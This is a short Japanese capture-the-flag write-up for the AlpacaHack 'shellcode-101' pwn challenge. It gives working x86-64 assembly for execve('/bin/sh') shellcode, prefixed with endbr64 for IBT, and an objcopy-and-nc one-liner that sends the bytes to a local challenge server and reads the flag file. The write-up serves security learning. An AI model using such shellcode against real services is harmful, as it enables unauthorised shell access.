# shellcode-101

https://alpacahack.com/daily/challenges/shellcode-101

## 問題の概要

shellcode を実行する PWN 問題です。

サーバーは入力したバイナリデータを機械語の命令列として実行してくれます。

フラグは `/flag.txt` に保存されています。

## 解法

[この問題を解いた日の問題](https://alpacahack.com/daily/challenges/pacapaca-sc) がちょうどシェルコード問題で、呼び出せる syscall が制限されている上位問題でした。

同じ入力でもフラグが得られそうですが、せっかくなので今回は `execve("/bin/sh", NULL, NULL)` を呼び出すシェルコードを作成してみます。

```asm
.global _start

.section .text
_start:
  endbr64
  sub    $0x8,%rsp
  mov    $0x68732f6e69622f, %rax  # "/bin/sh"
  mov    %rax, -0x8(%rsp)
  lea    -0x8(%rsp), %rdi   # arg1 = "/bin/sh"
  mov    $0x0, %rsi         # arg2 = NULL
  mov    $0x0, %rdx         # arg3 = NULL
  mov    $0x3b, %rax        # syscall number for execve
  syscall                   # call kernel
```

問題のバイナリは IBT が有効化されているため、`endbr64` 命令を最初に入れています。

GCC でアセンブルして実行してみると、ちゃんとシェルが起動することがわかります。

```bash
$ gcc -nostdlib -o execve execve.s
$ ./execve
# => /bin/sh が起動する
```

あとは命令のバイナリ列をサーバーに送ると shell が起動するので、`cat flag.txt` を実行してフラグを得ることができます。

```bash
$ (objcopy -j .text -O binary execve /dev/stdout; echo; echo "cat flag.txt" ) | nc localhost 9999
```
